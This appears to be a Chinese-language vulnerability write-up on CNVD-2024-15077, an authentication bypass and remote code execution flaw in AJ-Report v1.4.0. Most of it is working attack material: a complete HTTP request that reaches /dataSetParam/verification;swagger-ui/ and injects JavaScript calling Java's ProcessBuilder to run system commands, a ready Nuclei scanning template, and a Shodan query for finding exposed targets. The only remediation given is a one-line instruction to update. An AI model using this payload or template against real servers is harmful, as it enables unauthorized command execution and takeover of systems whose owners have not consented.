@[toc]

# 描述
 AJ-Report是全开源的一个BI平台，酷炫大屏展示，能随时随地掌控业务动态，让每个决策都有数据支撑。
    多数据源支持，内置mysql、elasticsearch、kudu驱动，支持自定义数据集省去数据接口开发，目前已支持30+种大屏组件/图表，不会开发，照着设计稿也可以制作大屏。
# 漏洞原理
通过调用/verification;swagger-ui/接口，构造js代码调用java类中的ProcessBuilder来执行系统命令并获取其输出
# 影响版本
AJ-Report v1.4.0
# 漏洞复现
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/28035ef28ba747c5ba12cb86fa3101c6.png)
构造请求数据包
```yaml
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 347

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"ip\",\"a\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}

```
数据包进行发送
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/c2c8890bf5ad4d148eebf3b78e5707ca.png)
漏洞复现成功

# 修复方案
更新至最新版本

```yaml

id: CNVD-2024-15077

info:
  name: AJ-Report 认证绕过与远程代码执行漏洞
  author: fgz
  severity: critical
  description: |
    AJ-Report是全开源的一个BI平台，酷炫大屏展示，能随时随地掌控业务动态，让每个决策都有数据支撑。多数据源支持，内置mysql、elasticsearch、kudu等多种驱动，支持自定义数据集省去数据接口开发，支持17+种大屏组件。在其1.4.0版本及以前，存在一处认证绕过漏洞，攻击者利用该漏洞可以绕过权限校验并执行任意代码。
  reference:
    - none
  metadata:
    verified: true
    max-request: 1
    shodan-query: title="AJ-Report"
  tags: cnvd,cnvd2024

http:
  - raw:
      - |
        POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: application/json;charset=UTF-8
        Connection: close
        
        {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"ipconfig\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}


    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'Windows IP')"
```

